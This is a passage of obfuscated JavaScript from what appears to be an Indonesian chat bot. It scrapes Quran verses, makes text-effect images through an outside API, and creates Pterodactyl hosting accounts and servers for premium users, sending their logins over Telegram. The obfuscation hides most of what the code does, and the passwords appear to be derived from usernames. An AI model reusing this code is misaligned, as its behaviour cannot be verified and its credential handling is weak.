)](_0x240d04(0x576)+_0x41a186[_0x240d04(0x899)]),console['log'](_0x240d04(0x2f8)+_0x41a186['Isha']);}break;case _0x240d04(0x2eba):{if(!(_0x483c03[0x0]||_0x483c03[0x1]))throw'contoh:\x0a'+_0x1ce978[_0x240d04(0x18ac)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1c3)+'\x20hasilnya\x20'+_0x240d04(0x122b)+'ah\x20Al-Fati'+_0x240d04(0x2be2));if(_0x1ce978[_0x240d04(0x2c94)](isNaN,_0x483c03[0x0])||isNaN(_0x483c03[0x1]))throw'contoh:\x0a'+_0x1ce978[_0x240d04(0x1625)](_0x1ec495,_0x3e6565)+('\x201\x202\x0a\x0amaka'+'\x20hasilnya\x20'+_0x240d04(0x122b)+_0x240d04(0x1ca5)+_0x240d04(0x2be2)+'\x20');const _0x32e377=String[_0x240d04(0x22e2)+'de'](0x200e),_0x2489a3=_0x32e377[_0x240d04(0xe6)](0xfa1);async function _0x46ce9b(_0x2612f6,_0x589aa5){const _0x25e306=_0x240d04,_0x590a3b={'Tigiz':function(_0x40519f,_0x1e8bf0){const _0x2dd404=a0_0x1014;return _0x1ce978[_0x2dd404(0x2db8)](_0x40519f,_0x1e8bf0);},'QuHkC':function(_0xd053e2,_0xbee205){return _0x1ce978['TGBkj'](_0xd053e2,_0xbee205);},'uAfTL':_0x1ce978[_0x25e306(0x17c4)]};if(_0x1ce978[_0x25e306(0x2843)](_0x25e306(0x1362),_0x1ce978[_0x25e306(0x25af)])){let _0x109c95=await _0x1ce978[_0x25e306(0x1496)](fetch,_0x25e306(0x257b)+'lam.sindon'+_0x25e306(0x1ede)+_0x25e306(0x28ef)+_0x589aa5+'/'+_0x2612f6);if(!_0x109c95['ok'])throw _0x25e306(0x1750)+_0x25e306(0x205b)+_0x25e306(0xce3);let _0x4de647=cheerio[_0x25e306(0x286b)](await _0x109c95['text']()),_0x3dbcf1=_0x1ce978[_0x25e306(0x2590)](_0x4de647,_0x25e306(0x1ac6)+_0x25e306(0x3f8)+_0x25e306(0xf74)+_0x25e306(0x1d5e)+_0x25e306(0x1154)+_0x25e306(0x2291)+_0x25e306(0x1bd1)+'st-content'+'.clearfix'),_0x1caa37=_0x4de647(_0x3dbcf1)['find'](_0x25e306(0x533)+_0x25e306(0x118f))['text'](),_0x57b15c=_0x1ce978[_0x25e306(0x2590)](_0x4de647,_0x3dbcf1)[_0x25e306(0x3de)](_0x1ce978[_0x25e306(0x23b)])['text'](),_0x2a3a02=_0x4de647(_0x3dbcf1)[_0x25e306(0x3de)](_0x1ce978['GjYJC'])[_0x25e306(0x1d8c)](),_0x40bbe2=_0x4de647(_0x3dbcf1)[_0x25e306(0x3de)](_0x1ce978[_0x25e306(0x2862)])['text'](),_0x1a0be7='';_0x4de647(_0x3dbcf1)['find'](_0x1ce978[_0x25e306(0x2e8f)])[_0x25e306(0x2889)](function(){const _0x18410c=_0x25e306;_0x1a0be7+=_0x590a3b['Tigiz'](_0x590a3b[_0x18410c(0x17bb)](_0x4de647,this)[_0x18410c(0x1d8c)](),'\x0a');}),_0x1a0be7=_0x1a0be7[_0x25e306(0x2d6d)]();let _0x4a02b1=_0x1ce978[_0x25e306(0x2db7)](_0x4de647,_0x3dbcf1)['find'](_0x1ce978[_0x25e306(0x1785)])['text'](),_0x11db9b=_0x25e306(0x6f6)+_0x25e306(0x2e50)+_0x25e306(0x843)+'sq/source/'+'s01/'+(_0x2612f6<0xa?'00':_0x1ce978['UHTSt'](_0x2612f6,0xa)&&_0x1ce978[_0x25e306(0x1bb8)](_0x2612f6,0x64)?'0':'')+_0x2612f6+(_0x1ce978[_0x25e306(0xdce)](_0x589aa5,0xa)?'00':_0x1ce978['IGORK'](_0x589aa5,0xa)&&_0x1ce978[_0x25e306(0x2eeb)](_0x589aa5,0x64)?'0':'')+_0x589aa5+_0x25e306(0x22a9);return{'surah':_0x1caa37,'arab':_0x57b15c,'latin':_0x2a3a02,'terjemahan':_0x40bbe2,'tafsir':_0x1a0be7,'audio':_0x11db9b,'keterangan':_0x4a02b1};}else return _0x590a3b[_0x25e306(0x17bb)](_0xd49c0e,_0x590a3b[_0x25e306(0x2c4)]);}let _0x41a57b=await _0x46ce9b(_0x483c03[0x0],_0x483c03[0x1]);_0x1ce978[_0x240d04(0x40f)](_0x476bfb,('\x0a'+_0x41a57b[_0x240d04(0x676)]+'\x0a'+_0x41a57b['latin']+'\x0a\x0a'+_0x41a57b[_0x240d04(0x18d3)]+'\x0a'+_0x2489a3+'\x0a'+_0x41a57b['tafsir']+_0x240d04(0x27ff)+_0x41a57b[_0x240d04(0x2d49)]+_0x240d04(0x1a19))[_0x240d04(0x2d6d)]());}break;case _0x1ce978[_0x240d04(0x1a9c)]:case _0x1ce978[_0x240d04(0x2a7c)]:case _0x1ce978[_0x240d04(0x1423)]:{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x2822)+'s2`\x0a\x0aConto'+_0x240d04(0x1d12)+_0x240d04(0x2ee2))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+'ofc`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978['rpLkc'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0xb79)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+'s2`\x0a\x0aConto'+_0x240d04(0x1d12)+_0x240d04(0x2ee2))+_0x1ce978[_0x240d04(0x1b2e)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x2c88)));mm=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=mm['split']('|')[0x0],_0x83dd4c=mm['split']('|')[0x1],_0x1ce978['lETcD'](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x40dad3=global[_0x240d04(0xd5e)](_0x1ce978['WtcHl'],_0x1ce978[_0x240d04(0x2264)](_0x240d04(0x727)+_0x240d04(0x1639),_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x23a652=await _0x1ce978['ICPNe'](fetch,_0x40dad3);if(!_0x23a652['ok'])throw await _0x23a652[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0x40dad3},{'caption':lang['ok']});}break;case _0x1ce978['ZoBHl']:case _0x1ce978[_0x240d04(0x1cdc)]:case _0x1ce978[_0x240d04(0x23cf)]:case _0x1ce978['rgLEq']:case _0x1ce978[_0x240d04(0x1d0b)]:case _0x1ce978[_0x240d04(0x2006)]:case _0x1ce978[_0x240d04(0x1a04)]:case _0x240d04(0x1086)+_0x240d04(0x20fe):case _0x240d04(0x2b25):case _0x1ce978['RHmEm']:case _0x240d04(0x1028)+'d':case _0x1ce978['BgrHm']:case _0x1ce978[_0x240d04(0x16cd)]:case _0x240d04(0x2ba0):case _0x1ce978['iiOnu']:case _0x1ce978[_0x240d04(0x1f30)]:case _0x1ce978[_0x240d04(0x2138)]:case _0x1ce978[_0x240d04(0x29fc)]:case _0x1ce978[_0x240d04(0xe30)]:case _0x1ce978[_0x240d04(0xfe9)]:case _0x1ce978[_0x240d04(0x20b6)]:case _0x1ce978[_0x240d04(0x1d9b)]:case _0x240d04(0x139c):case _0x1ce978[_0x240d04(0x2eb8)]:case _0x1ce978[_0x240d04(0x26ee)]:case _0x1ce978[_0x240d04(0x1011)]:case _0x1ce978['oqSEH']:case'underwater'+_0x240d04(0x15fa):case _0x1ce978['RQdRi']:case _0x1ce978['phKrL']:case _0x1ce978[_0x240d04(0x24bd)]:case _0x1ce978[_0x240d04(0x1eed)]:case _0x240d04(0x1959):case _0x1ce978[_0x240d04(0x1955)]:case _0x1ce978[_0x240d04(0x2a3b)]:case _0x1ce978[_0x240d04(0x22ca)]:case'love-messa'+'ge':case'textoncup2':case _0x1ce978['hAGYL']:case'smoke':case _0x1ce978[_0x240d04(0x2427)]:case _0x1ce978[_0x240d04(0x2a88)]:case _0x1ce978[_0x240d04(0x1b91)]:case _0x1ce978[_0x240d04(0x15e4)]:{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x15ef)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2a57)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978['cUMsq'](_0x1ec495,_0x3e6565)+_0x240d04(0x22ab));if(_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x27ee)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x2071)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2a57)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978['lceUn'](_0x1ec495,_0x3e6565)+_0x240d04(0x22ab));_0x476bfb(lang[_0x240d04(0x172a)]);let _0x562e73=global['api'](_0x1ce978['WtcHl'],_0x1ce978['PpZnB']+_0x3e6565,{'text':_0x33cfb1},'apikey'),_0x34dfd1=await _0x1ce978[_0x240d04(0x1af7)](fetch,_0x562e73);if(!_0x34dfd1['ok'])throw await _0x34dfd1['text']();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x562e73},{'caption':lang['ok']});}break;case'nulis':_0x1ce978['Yymbg'](_0x476bfb,'Pilihan\x20Fi'+_0x240d04(0x101b)+_0x240d04(0x2cb5)+_0x1ec495+(_0x240d04(0x6d6)+_0x240d04(0x9f6))+_0x1ec495+('nuliskanan'+_0x240d04(0x92d))+_0x1ec495+(_0x240d04(0x5ad)+_0x240d04(0x268e))+_0x1ec495+(_0x240d04(0x6ad)+'\x0a\x0aContoh:\x0a'+'`')+_0x1ec495+(_0x240d04(0x128e)+'Subscribe\x20'+_0x240d04(0x1bbd)+_0x240d04(0xbe4)));break;case _0x1ce978[_0x240d04(0x18e4)]:case _0x240d04(0x6ad):case _0x1ce978['tNRDa']:case _0x1ce978[_0x240d04(0xcb)]:{if(_0x1ce978[_0x240d04(0x1a0c)](_0x240d04(0x20e0),_0x240d04(0x101a))){if(_0x1ce978[_0x240d04(0x13ac)](_0x33cfb1[_0x240d04(0x2b45)],0x2))return _0x476bfb(_0x240d04(0x2972)+'ntah:\x0a`'+(_0x1ec495+_0x3e6565)+('\x20teks`\x0a\x0aCo'+'ntoh\x20pengg'+_0x240d04(0x2b1))+_0x1ce978[_0x240d04(0x10f4)](_0x1ec495,_0x3e6565)+(_0x240d04(0x27aa)+_0x240d04(0x32e)));_0x1ce978[_0x240d04(0x2d07)](_0x476bfb,lang['wait']);const _0x36c5c5=_0x33cfb1;let _0x2ce305=global[_0x240d04(0xd5e)](_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x1a78)](_0x240d04(0x175b)+'s/',_0x3e6565),{'text':_0x36c5c5},_0x1ce978['EEoOe']),_0x4c8bdc=await _0x1ce978['lsyYT'](fetch,_0x2ce305);if(!_0x4c8bdc['ok'])throw await _0x4c8bdc[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x2ce305},{'caption':lang['ok']});}else _0x29066d(_0x1ce978['asNVy']);}break;case _0x1ce978[_0x240d04(0x3f3)]:case _0x1ce978[_0x240d04(0x2084)]:case _0x1ce978[_0x240d04(0x2e44)]:case _0x1ce978[_0x240d04(0x1aad)]:case _0x240d04(0x1b05):case _0x240d04(0x2611):case _0x1ce978[_0x240d04(0x25d8)]:case _0x1ce978[_0x240d04(0x12d0)]:case _0x240d04(0x2e84):case _0x1ce978['bEPBy']:case _0x240d04(0x2e1):case _0x1ce978['pLKZP']:case _0x1ce978[_0x240d04(0x2465)]:case _0x1ce978[_0x240d04(0x2858)]:case _0x1ce978[_0x240d04(0xe56)]:case _0x1ce978[_0x240d04(0x18c3)]:case _0x1ce978[_0x240d04(0x1378)]:case _0x240d04(0x1219)+'ry':case _0x1ce978['YHCGD']:case _0x1ce978['CavFy']:case _0x1ce978['LeuqO']:case _0x240d04(0x2722):case _0x1ce978[_0x240d04(0xfdb)]:case _0x1ce978[_0x240d04(0x261e)]:case _0x1ce978[_0x240d04(0x319)]:case _0x1ce978[_0x240d04(0x1927)]:case _0x1ce978['AOTau']:case _0x1ce978['kYfAL']:case _0x240d04(0x1f2f):case _0x1ce978['KmQYJ']:case _0x1ce978[_0x240d04(0x1869)]:case _0x1ce978[_0x240d04(0x1894)]:case _0x1ce978['XETHB']:case _0x1ce978[_0x240d04(0x76e)]:case _0x1ce978[_0x240d04(0x10d9)]:case _0x1ce978[_0x240d04(0x6f8)]:case _0x1ce978['AwRan']:case _0x1ce978[_0x240d04(0x1e9c)]:case _0x240d04(0xba9):case'deluxe-gol'+'d':case _0x1ce978[_0x240d04(0x17f6)]:case _0x1ce978[_0x240d04(0x2df4)]:case'discovery':case _0x1ce978[_0x240d04(0x178d)]:case _0x1ce978['RRUPd']:case _0x1ce978[_0x240d04(0x217b)]:case _0x1ce978[_0x240d04(0x193c)]:case _0x1ce978[_0x240d04(0x666)]:case _0x1ce978[_0x240d04(0x11b1)]:case _0x1ce978[_0x240d04(0x69b)]:case _0x1ce978[_0x240d04(0x1b5)]:case _0x1ce978[_0x240d04(0x19bf)]:case _0x1ce978[_0x240d04(0x2d0f)]:case _0x1ce978[_0x240d04(0x1908)]:case _0x1ce978[_0x240d04(0x1205)]:case _0x1ce978[_0x240d04(0x1a77)]:case _0x1ce978['XIrbZ']:case _0x1ce978[_0x240d04(0x254d)]:case _0x1ce978[_0x240d04(0x1065)]:case'gold-spark'+_0x240d04(0x2937):case _0x1ce978['tXUni']:case _0x1ce978[_0x240d04(0x2186)]:case _0x1ce978[_0x240d04(0x10d7)]:case _0x1ce978[_0x240d04(0x1a67)]:case _0x240d04(0x13ef)+'s':case _0x240d04(0x2638)+'ter':case _0x1ce978[_0x240d04(0x1aa6)]:case _0x1ce978[_0x240d04(0xefa)]:case _0x1ce978[_0x240d04(0x16b3)]:case _0x240d04(0xdf2):case'halloween2':case _0x1ce978[_0x240d04(0x26c8)]:case _0x1ce978[_0x240d04(0x109c)]:case _0x1ce978[_0x240d04(0x2931)]:case _0x1ce978[_0x240d04(0x3a9)]:case _0x1ce978[_0x240d04(0x9e1)]:case _0x1ce978[_0x240d04(0xbb2)]:case _0x240d04(0x1f6):case _0x240d04(0x211c):case _0x1ce978[_0x240d04(0xec5)]:case _0x1ce978[_0x240d04(0x808)]:case _0x1ce978[_0x240d04(0x2c20)]:case _0x1ce978['REZvk']:case _0x1ce978[_0x240d04(0x191e)]:case _0x1ce978['Giddk']:case _0x1ce978['ZoOwd']:case _0x1ce978[_0x240d04(0x8e2)]:case _0x1ce978['XLlUT']:case _0x1ce978[_0x240d04(0x236a)]:case _0x1ce978[_0x240d04(0x1a84)]:case _0x240d04(0x16ed):case _0x1ce978[_0x240d04(0xf01)]:case _0x1ce978['iIlKz']:case _0x1ce978[_0x240d04(0x2169)]:case _0x1ce978[_0x240d04(0x2d4)]:case _0x1ce978[_0x240d04(0x167a)]:case _0x240d04(0x28de):case _0x240d04(0x26eb)+'ss':case _0x240d04(0x25f9)+'elry':case _0x1ce978[_0x240d04(0x13a)]:case _0x1ce978['EyifC']:case _0x1ce978[_0x240d04(0x2c0a)]:case _0x1ce978[_0x240d04(0xd36)]:case _0x1ce978[_0x240d04(0xf8b)]:case _0x1ce978[_0x240d04(0x1d3a)]:case _0x1ce978[_0x240d04(0x1139)]:case _0x1ce978[_0x240d04(0x470)]:case _0x240d04(0x1c7c):case _0x1ce978[_0x240d04(0x24fe)]:case _0x1ce978[_0x240d04(0x2d8e)]:case _0x1ce978[_0x240d04(0x1091)]:case _0x1ce978[_0x240d04(0xcbf)]:case'purple-spa'+_0x240d04(0xd0a):case _0x1ce978[_0x240d04(0xe93)]:case _0x1ce978[_0x240d04(0xd2f)]:case _0x240d04(0x7c8):case _0x240d04(0xd74)+'y':case _0x1ce978[_0x240d04(0x2e1c)]:case _0x1ce978[_0x240d04(0x13d9)]:case _0x1ce978['ACMXu']:case _0x240d04(0x2dc8):case _0x1ce978['smbYR']:case _0x1ce978['nReYT']:case _0x1ce978[_0x240d04(0xc47)]:case'silver-gli'+_0x240d04(0x1107):case _0x1ce978[_0x240d04(0x24fb)]:case _0x240d04(0x252d):case _0x1ce978[_0x240d04(0x55a)]:case _0x1ce978[_0x240d04(0x245e)]:case _0x1ce978[_0x240d04(0xd8a)]:case _0x240d04(0x2e8b):case _0x1ce978['YsoiF']:case _0x1ce978[_0x240d04(0x284f)]:case _0x1ce978[_0x240d04(0x79f)]:case _0x1ce978[_0x240d04(0x221)]:case _0x240d04(0xd63):case _0x1ce978[_0x240d04(0xec9)]:case _0x1ce978[_0x240d04(0x29a7)]:case _0x240d04(0x1bd9):case _0x1ce978[_0x240d04(0xbd9)]:case _0x240d04(0x1cef):case _0x1ce978[_0x240d04(0x10a6)]:case _0x240d04(0x2e35):case _0x1ce978[_0x240d04(0x1cd5)]:case _0x1ce978[_0x240d04(0x1827)]:case _0x1ce978[_0x240d04(0x1ed2)]:case _0x1ce978[_0x240d04(0x441)]:case _0x240d04(0x2701)+'ss':case _0x1ce978[_0x240d04(0x37e)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x2d6)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1e29)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2a57)+'ntoh\x20pengg'+'unaan:\x0a`')+_0x1ce978[_0x240d04(0x72f)](_0x1ec495,_0x3e6565)+'\x20NdikzOne`');if(_0x33cfb1['includes']('|'))return _0x1ce978['WmvGS'](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x740)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2a57)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+(_0x1ec495+_0x3e6565)+_0x240d04(0x22ab));_0x1ce978[_0x240d04(0x1057)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x1584ed=global[_0x240d04(0xd5e)](_0x240d04(0x10a),_0x1ce978[_0x240d04(0x1ca7)](_0x1ce978[_0x240d04(0x27dd)],_0x3e6565),{'text':_0x33cfb1},_0x240d04(0x23aa)),_0x1d42e0=await fetch(_0x1584ed);if(_0x1d42e0['status']!=0xc8)throw await _0x1d42e0['text']();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0x1584ed},{'caption':lang['ok']});}break;case _0x1ce978[_0x240d04(0x1e0d)]:case _0x1ce978['IMMod']:case _0x1ce978[_0x240d04(0x9da)]:case _0x1ce978['ccqXr']:case _0x1ce978['ckwsN']:case _0x240d04(0x479)+_0x240d04(0xee7):case _0x1ce978[_0x240d04(0x5c7)]:case _0x1ce978['iMVSQ']:case _0x1ce978[_0x240d04(0x18c2)]:case _0x1ce978[_0x240d04(0x148d)]:case _0x1ce978[_0x240d04(0x313)]:case'marvel2':case _0x1ce978[_0x240d04(0x199c)]:case _0x240d04(0x14e7):case _0x240d04(0xdcc):case _0x1ce978['OYtvw']:case _0x1ce978['IjopD']:case _0x240d04(0x1a05)+'xy':case _0x240d04(0x228d)+'er':case _0x240d04(0xee0):case _0x1ce978[_0x240d04(0x27cd)]:case _0x1ce978[_0x240d04(0x2355)]:case _0x1ce978[_0x240d04(0xcc1)]:case _0x240d04(0x2949):case _0x1ce978[_0x240d04(0x2ad4)]:case _0x1ce978[_0x240d04(0x14b1)]:case _0x1ce978[_0x240d04(0x17ba)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x221a)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['hJRcf'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x826)+'h\x20pengguna'+_0x240d04(0x2ee2))+_0x1ce978['pVUJs'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x2c88)));if(_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0x297e)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0xba1)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x826)+_0x240d04(0x1d12)+_0x240d04(0x2ee2))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x2c88)));mm=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=mm[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=mm[_0x240d04(0x1c39)]('|')[0x1],_0x1ce978[_0x240d04(0xfbd)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x53a7d7=global[_0x240d04(0xd5e)](_0x1ce978['WtcHl'],_0x1ce978[_0x240d04(0x834)]('/api/textp'+'ro/',_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0xc85112=await fetch(_0x53a7d7);if(!_0xc85112['ok'])throw await _0xc85112[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x53a7d7},{'caption':lang['ok']});}break;case _0x1ce978[_0x240d04(0x296d)]:{if(!_0x69d638)return _0x1ce978['znFtk'](_0x476bfb,_0x240d04(0x2854)+'khusus\x20pre'+_0x240d04(0x239));const _0x193810=_0x33cfb1[_0x240d04(0x1c39)](',');if(_0x1ce978[_0x240d04(0x15ba)](_0x193810[_0x240d04(0x2b45)],0x2))return _0x1ce978[_0x240d04(0x2681)](_0x476bfb,_0x240d04(0x17e9)+_0x240d04(0x2c0b)+_0x240d04(0x2458)+_0x1ce978['svGjP'](_0x1ec495,_0x3e6565)+(_0x240d04(0x329)+'le'));const _0xa178b7=_0x193810[0x0],_0x4aa294=_0x193810[0x1];let _0x4e266c=_0xa178b7,_0xbf042b=global[_0x240d04(0x107)],_0x4c2542=global[_0x240d04(0x241e)],_0x51b13e='0',_0xff982='0',_0x321c85='0',_0x13f503=_0x1ce978[_0x240d04(0x12ca)](_0xa178b7,_0x1ce978['IcpXF']);try{if(_0x1ce978[_0x240d04(0x1125)](_0x1ce978[_0x240d04(0x168a)],_0x240d04(0xfc2))){let _0x2480ad=_0x1ce978[_0x240d04(0x7b9)](_0xa178b7,_0x1ce978[_0x240d04(0x1bfa)]),_0x534924=await _0x1ce978['lZsyd'](fetch,_0x1ce978[_0x240d04(0x260e)](domain,_0x1ce978[_0x240d04(0x1f58)]),{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Accept':_0x1ce978['btLYK'],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978['UutfA'](_0x1ce978[_0x240d04(0x2c45)],apikey)},'body':JSON['stringify']({'email':_0x13f503,'username':_0xa178b7,'first_name':_0xa178b7,'last_name':_0xa178b7,'language':'en','password':_0x2480ad})}),_0x56cda9=await _0x534924[_0x240d04(0x1314)]();if(_0x56cda9['errors'])return _0x1ce978[_0x240d04(0x2d78)](_0x476bfb,JSON[_0x240d04(0x1cf5)](_0x56cda9[_0x240d04(0x247c)][0x0],null,0x2));let _0x393dc9=_0x56cda9[_0x240d04(0x2e69)],_0xc7e4eb=await _0x1ce978[_0x240d04(0x2848)](fetch,_0x1ce978[_0x240d04(0x2db8)](domain,_0x1ce978[_0x240d04(0x1615)])+_0xbf042b,{'method':_0x1ce978[_0x240d04(0x1764)],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x240d04(0x2724)+_0x240d04(0x13e4),'Authorization':_0x1ce978[_0x240d04(0xe8f)](_0x240d04(0x13f5),apikey)}});const _0x43d4cd=_0x240d04(0x431)+_0x19007e+('\x0a\x0a⎙─➤\x20*👤US'+_0x240d04(0xae0))+_0x393dc9[_0x240d04(0x181b)]+(_0x240d04(0x1d64)+_0x240d04(0x2424))+_0x2480ad+(_0x240d04(0x115)+_0x240d04(0x17d2))+linkpanel+(_0x240d04(0x2863)+_0x240d04(0x2e3b)+'MENGIRIM\x201'+_0x240d04(0x2573)+_0x240d04(0xf8d)+'HON\x20DI\x20SIM'+'PAN\x20BAIK\x20B'+'AIK\x0aKALAU\x20'+'DATA\x20AKUN\x20'+'ANDA\x20HILAN'+_0x240d04(0x224f)+'DAK\x20DAPAT\x20'+_0x240d04(0x2b10)+_0x240d04(0x527)+_0x240d04(0x19ae)+_0x240d04(0x1775)+_0x240d04(0x1775)+'=========='+'=\x0a');await _0x23c0de['telegram']['sendMessag'+'e'](_0x4aa294,_0x43d4cd,{'disable_web_page_preview':!![]});let _0x407c18=await _0xc7e4eb[_0x240d04(0x1314)](),_0x2537f9=await _0x1ce978[_0x240d04(0x914)](fetch,_0x1ce978['mQnVN'](domain,_0x1ce978[_0x240d04(0x1d08)]),{'method':_0x240d04(0x4c1),'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x1de1)](_0x1ce978[_0x240d04(0x2c45)],apikey)},'body':JSON[_0x240d04(0x1cf5)]({'name':_0x4e266c,'description':'\x20','user':_0x393dc9['id'],'egg':_0x1ce978['uenms'](parseInt,_0xbf042b),'docker_image':_0x1ce978['MzhZx'],'startup':_0x1ce978[_0x240d04(0x2dd0)],'environment':{'INST':_0x1ce978[_0x240d04(0x10c3)],'USER_UPLOAD':'0','AUTO_UPDATE':'0','CMD_RUN':'npm\x20start'},'limits':{'memory':_0x51b13e,'swap':0x0,'disk':_0x321c85,'io':0x1f4,'cpu':_0xff982},'feature_limits':{'databases':0x5,'backups':0x5,'allocations':0x1},'deploy':{'locations':[_0x1ce978[_0x240d04(0x18ab)](parseInt,_0x4c2542)],'dedicated_ip':![],'port_range':[]}})}),_0x57329d=await _0x2537f9[_0x240d04(0x1314)]();if(_0x57329d[_0x240d04(0x247c)])return _0x1ce978[_0x240d04(0x1c63)](_0x476bfb,JSON['stringify'](_0x57329d[_0x240d04(0x247c)][0x0],null,0x2));let _0x59def4=_0x57329d[_0x240d04(0x2e69)],_0x2f9036=await _0x1ce978['JbJud'](_0x476bfb,'\x0a*SUCCESSF'+_0x240d04(0x1ebe)+_0x240d04(0x6b4)+_0x240d04(0x62e)+_0x240d04(0x1ee7)+_0x393dc9['id']+_0x240d04(0xe01)+_0x393dc9['first_name']+'\x20'+_0x393dc9['last_name']+_0x240d04(0x242c)+(_0x59def4[_0x240d04(0x25d5)][_0x240d04(0x187b)]===0x0?_0x1ce978[_0x240d04(0xc1a)]:_0x59def4[_0x240d04(0x25d5)][_0x240d04(0x187b)])+_0x240d04(0x173)+(_0x1ce978[_0x240d04(0xd0d)](_0x59def4[_0x240d04(0x25d5)][_0x240d04(0x26cd)],0x0)?_0x1ce978[_0x240d04(0xc1a)]:_0x59def4[_0x240d04(0x25d5)][_0x240d04(0x26cd)])+_0x240d04(0x2541)+_0x59def4[_0x240d04(0x25d5)]['cpu']+_0x240d04(0x733));}else _0x32e2c4[_0x240d04(0x22b5)+_0x240d04(0xfd5)](_0x360c95,_0x415859[_0x240d04(0x1cf5)]({}));}catch{if(_0x1ce978[_0x240d04(0x1a70)]('wAwqs',_0x1ce978['lWRJL'])){if(_0x1ce978['JbnAP'](_0xa9bc84,'\x20'))return'\x20';return _0x1ce978['LDqCu'](_0x1ce978['FHfsx'](_0x1f3d28,0x2),0x0)?_0x5923b4:'_';}else _0x1ce978[_0x240d04(0x27fb)](_0x476bfb,_0x1ce978[_0x240d04(0x273c)]);}}break;case _0x240d04(0x1d9):{if(!_0x69d638)return _0x1ce978['lOCkl'](_0x476bfb,_0x1ce978[_0x240d04(0xe02)]);const _0x593e03=_0x33cfb1[_0x240d04(0x1c39)](',');if(_0x1ce978[_0x240d04(0xdce)](_0x593e03[_0x240d04(0x2b45)],0x2))return _0x1ce978['anWsM'](_0x476bfb,'*Format\x20sa'+'lah!*\x0aPeng'+'gunaan:\x20'+(_0x1ec495+_0x3e6565)+(_0x240d04(0x329)+'le'));const _0x2acfb5=_0x593e03[0x0],_0x369cbc=_0x593e03[0x1];let _0x2972da=_0x2acfb5,_0x1178f6=global[_0x240d04(0x107)],_0x13cbf3=global['location3'],_0x259d5c=_0x1ce978[_0x240d04(0x1c2e)],_0x1928ab='30',_0x1729a3=_0x1ce978[_0x240d04(0x1c2e)],_0x24a4f5=_0x1ce978[_0x240d04(0x1a81)](_0x2acfb5,_0x1ce978['IcpXF']);try{let _0x2e9053=_0x1ce978['BrsNE'](_0x2acfb5,_0x1ce978['QXBsn']),_0x53f9e6=await _0x1ce978[_0x240d04(0x1477)](fetch,_0x1ce978['JHWic'](domain,_0x1ce978['AErmr']),{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Accept':_0x1ce978['btLYK'],'Content-Type':_0x1ce978['btLYK'],'Authorization':_0x1ce978[_0x240d04(0x461)](_0x1ce978[_0x240d04(0x2c45)],apikey)},'body':JSON[_0x240d04(0x1cf5)]({'email':_0x24a4f5,'username':_0x2acfb5,'first_name':_0x2acfb5,'last_name':_0x2acfb5,'language':'en','password':_0x2e9053})}),_0x2ce8bd=await _0x53f9e6['json']();if(_0x2ce8bd['errors'])return _0x476bfb(JSON[_0x240d04(0x1cf5)](_0x2ce8bd['errors'][0x0],null,0x2));let _0x192313=_0x2ce8bd['attributes'],_0x2f66b0=await 